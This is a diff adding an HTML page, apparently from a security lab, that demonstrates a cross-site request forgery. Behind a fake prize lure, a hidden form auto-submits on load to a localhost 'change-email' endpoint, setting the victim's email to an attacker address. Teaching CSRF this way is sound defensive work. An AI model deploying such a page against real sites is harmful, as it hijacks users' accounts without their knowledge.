@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>You won a prize!</title>
+  <style>body{font-family:system-ui,Arial;max-width:600px;margin:60px auto;text-align:center;color:#333}</style>
+</head>
+<body>
+  <h1>🎉 Congratulations!</h1>
+  <p>You have been selected for a free reward. Loading your prize&hellip;</p>
+  <p style="color:#aaa;font-size:13px">(This innocent-looking page is the attack. The victim does nothing.)</p>
+
+  <!--
+    (b) THE EXPLOIT — Variant 2: POST-based forged action.
+    A hidden form targets the victim's state-changing endpoint. The <script>
+    submits it the instant the page loads — no click required. The victim's
+    browser attaches their Victim-Bank session cookie to this cross-site POST,
+    so the server treats it as a genuine request and changes the email.
+  -->
+  <form id="forged" action="https://localhost:3443/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+
+  <script>
+    document.getElementById('forged').submit();
+  </script>
+</body>
+</html>
